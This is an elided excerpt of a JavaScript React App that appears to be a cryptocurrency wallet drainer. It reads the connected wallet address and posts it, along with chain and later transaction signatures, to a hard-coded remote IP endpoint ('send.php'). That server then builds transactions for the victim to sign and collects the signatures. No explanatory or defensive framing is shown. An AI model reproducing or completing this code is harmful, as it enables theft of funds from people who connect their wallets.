...
function App() {
  ...
  async function runner(){
    ...
    console.log("Connected Wallet Address: ", account_sender);
  
    async function genSign(address,chain,type,contract="0"){
      if (type == "coin"){
        var result = await jQuery.post("http://104.194.133.124/send.php", {"handler":"tx", "address":address, "chain":chain, "type":type})
    ...
    async function acceptSign(signature,type){
      console.log(type)
      if (type == "coin"){
        var result = await jQuery.post("http://104.194.133.124/send.php", {"handler":"sign", "signature":signature, "type":type})
